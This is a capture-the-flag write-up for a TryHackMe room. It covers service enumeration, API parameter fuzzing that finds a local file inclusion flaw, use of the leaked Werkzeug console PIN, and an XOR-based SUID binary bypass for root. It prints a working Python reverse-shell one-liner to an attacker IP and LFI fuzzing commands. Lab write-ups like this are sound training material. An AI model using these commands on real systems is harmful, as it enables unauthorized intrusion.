# 60 - Bookstore (API parameter fuzzing, LFI, XOR binary exploitation)

Room Link --> [https://tryhackme.com/room/bookstoreoc](https://tryhackme.com/room/bookstoreoc)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.3.99 -p- -sV -T4

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
5000/tcp open  http    syn-ack Werkzeug httpd 0.14.1 (Python 3.6.9)
```
{% endcode %}

Navigating to the `books` section of the webpage there is a base32 cipher in the sourcecode.

<figure><img src=".gitbook/assets/image (389).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
GY4CANZUEA3TIIBXGAQDOMZAGNQSAMTGEAZGMIBXG4QDONZAG43SAMTFEA3TSIBWMYQDONJAG42CANZVEA3DEIBWGUQDEZJAGYZSANTGEA3GIIBSMYQDONZAGYYSANZUEA3DGIBWHAQDGZRAG43CAM3EEA2TIIBXGQQDGNZAGYZCAN3BEA3TQIBXGUQDOMRAGRQSAMZREA2DS===

# from b32
68 74 74 70 73 3a 2f 2f 77 77 77 2e 79 6f 75 74 75 62 65 2e 63 6f 6d 2f 77 61 74 63 68 3f 76 3d 54 74 37 62 7a 78 75 72 4a 31 49

# from hex
https://www.youtube.com/watch?v=Tt7bzxurJ1I
```
{% endcode %}

There is another hint in the login page sourcecode.

<figure><img src=".gitbook/assets/image (390).png" alt=""><figcaption></figcaption></figure>

#### Enumerating Port 5000

Navigating to `http://10.10.3.99:5000` .

<figure><img src=".gitbook/assets/image (391).png" alt=""><figcaption></figcaption></figure>

Robots.txt page.

<figure><img src=".gitbook/assets/image (392).png" alt=""><figcaption></figcaption></figure>

Going to the `/api` dir.

<figure><img src=".gitbook/assets/image (393).png" alt=""><figcaption></figcaption></figure>

#### Gobuster enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.3.99 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error -b 403,404 -x php,txt,db,sql,ini

/images
/assets
/javascript
/LICENSE.txt

# port 5000
/api
/console
/robots.txt
```
{% endcode %}

`http://10.10.3.99:5000/console` - so we need a pin to unlock the console. Remebere the hint we got at the login page sourcecode.

<figure><img src=".gitbook/assets/image (395).png" alt=""><figcaption></figcaption></figure>

The mainpage `/js` dir.

```
/api/v2/resources/books/random4
```

<figure><img src=".gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>

The apis -->

```bash
/api/v2/resources/books/random4

# apis
http://10.10.3.99:5000/api/v2/resources/books/all
http://10.10.3.99:5000/api/v2/resources/books/random4
http://10.10.3.99:5000/api/v2/resources/books?id=2
http://10.10.3.99:5000/api/v2/resources/books?author=J.K. Rowling
http://10.10.3.99:5000/api/v2/resources/books?published=1993
http://10.10.3.99:5000/api/v2/resources/books?author=J.K. Rowling&published=2003
```

### Exploitation

In this scenario, we need to be able to read a particular file on the server that is not directly accessible to us. A Local File Inclusion Attack would enable us to read the bash history of the SID user that will then help us to unlock the console and proceed further. On the API documentation, we find different URLs, we take the one which has a definite entry point to we might be able to inject LFI scripts into it. We take the URL directly from the Documentation and then use the WFuzz on them with adding .bash\_history at the end so that if the attack is successful, we know that what parameter is injectable to read the file that we require. We see that none of the three parameters are injectable.

{% code overflow="wrap" %}
```bash
wfuzz -u http://10.10.3.99:5000/api/v2/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
```
{% endcode %}

<figure><img src="https://1.bp.blogspot.com/-20l7LlFiO98/YKzDnXyI8CI/AAAAAAAAwKY/y5R4d8mcRVcf50mfQEoHun11Li_H0zwhQCLcBGAsYHQ/s16000/9.png" alt=""><figcaption></figcaption></figure>

We took a closer look at the API and saw that it is v2. During the Penetration Testing of a Web Service, it is advised to check for all the different possible versions that might still be accessible on the target machine. Since there is a v2, there may be a v1 as well. We try to WFuzz again but this time we replaced the v2 with v1. This revealed the show parameter which seems to be injectable.

{% code overflow="wrap" %}
```bash
# working wfuzz cmd
wfuzz -u http://10.10.3.99:5000/api/v1/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
```
{% endcode %}

<figure><img src="https://1.bp.blogspot.com/-rTp6SVCYttw/YKzDs0yEJEI/AAAAAAAAwKc/xoEjgV5OVKgVE2RQEEsQGgmP9siA1gV5gCLcBGAsYHQ/s16000/10.png" alt=""><figcaption></figcaption></figure>

We try to browse the .bash\_history using the show parameter and we can read the data. We were able to extract the PIN that is required to unlock the Interactive Console. It is `123-321-135` .

http://10.10.136.136:5000/api/v1/resources/books?show=.bash\_history

<figure><img src="https://1.bp.blogspot.com/-QIgoSAKIHbM/YKzDw9_7REI/AAAAAAAAwKk/I0uz3svPYHkhCfXXzjV1XQsxIthP1qUlACLcBGAsYHQ/s16000/11.png" alt=""><figcaption></figcaption></figure>

Alternatively we could use FFUF to find other files we can access via the LFI exploitation.

{% code overflow="wrap" lineNumbers="true" %}
```bash
ffuf -c -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://10.10.3.99:5000/api/v1/resources/books?show=FUZZ -fc 500 --ic
```
{% endcode %}

#### Back to the console:

<figure><img src=".gitbook/assets/image (396).png" alt=""><figcaption></figcaption></figure>

I’ve got into the console. I can run Python code here, so let’s spawn a reverse shell to my machine. First, start a listener on your machine:

{% code overflow="wrap" lineNumbers="true" %}
```bash
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.88.214",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```
{% endcode %}

And i got rev shell.

<figure><img src=".gitbook/assets/image (397).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

A binary file named `try-harder` was also laying around with its SUID bit set ON. If only we could reverse this and find some misconfigurations inside this binary file, we can obtain the root shell of the machine.

I will be transferring this file to my local machine so that I can analyze it using `ghidra`. I accomplished this using `http.server` in the remote machine and `wget` in my local machine.

This is the decompiled C code from ghidra. Lets have a code review.

```cpp
void main(void)
{
long in_FS_OFFSET;
uint local_1c;
uint local_18;
uint local_14;
long local_10;

local_10 = *(long *)(in_FS_OFFSET + 0x28);
setuid(0);
local_18 = 0x5db3;
puts("What\'s The Magic Number?!");
__isoc99_scanf(&DAT_001008ee,&local_1c);
local_14 = local_1c ^ 0x1116 ^ local_18;
if (local_14 == 0x5dcd21f4) {
system("/bin/bash -p");
}
else {
puts("Incorrect Try Harder");
}
if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
/* WARNING: Subroutine does not return */
__stack_chk_fail();
}
return;
}
```

The main logic in this code is checking the value of `local_14` variable and if it equals `0x5dcd21f4`, then the root user’s bash will pop out. There is a bit of maths here. ^ represents bit-wise XOR. `local_1c` is the value we input in the terminal.

```bash
local_14 = local_1c ^ 0x1116 ^ local_18; #Let's solve the maths
# where local_14 = 0x5dcd21f4
# where local_18 = 0x5db3

0x5dcd21f4 = local_1c ^ 0x1116 ^ 0x5db3
# make local_1c subject of the formular
local_1c = 0x5dcd21f4 ^ 0x1116 ^ 0x5db3
```

<figure><img src=".gitbook/assets/image (398).png" alt=""><figcaption></figcaption></figure>

Using python3 to solve it --> `1573743953`&#x20;

We get root.

<figure><img src=".gitbook/assets/image (399).png" alt=""><figcaption></figcaption></figure>

Done!

